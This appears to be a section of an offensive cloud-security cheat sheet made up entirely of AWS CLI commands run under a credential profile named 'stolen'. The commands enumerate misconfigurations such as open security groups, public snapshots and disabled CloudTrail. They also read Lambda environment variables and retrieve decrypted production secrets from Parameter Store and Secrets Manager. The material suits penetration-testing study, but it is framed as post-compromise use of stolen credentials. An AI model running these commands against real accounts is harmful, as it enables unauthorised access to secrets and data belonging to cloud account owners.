## 🔧 Common Misconfigurations

```bash
# Open security groups
aws ec2 describe-security-groups --profile stolen | grep "0.0.0.0/0"

# Unencrypted EBS volumes
aws ec2 describe-volumes --query 'Volumes[?Encrypted==`false`]' --profile stolen

# Public RDS snapshots
aws rds describe-db-snapshots --include-public --profile stolen

# Exposed Lambda environment variables
aws lambda get-function-configuration --function-name target-function --profile stolen

# CloudTrail disabled?
aws cloudtrail describe-trails --profile stolen
aws cloudtrail get-trail-status --name trail-name --profile stolen

# Public AMIs
aws ec2 describe-images --owners self --filters "Name=is-public,Values=true" --profile stolen

# Secrets in Parameter Store (if access)
aws ssm describe-parameters --profile stolen
aws ssm get-parameter --name /prod/db/password --with-decryption --profile stolen

# Secrets Manager
aws secretsmanager list-secrets --profile stolen
aws secretsmanager get-secret-value --secret-id prod/db/creds --profile stolen
```

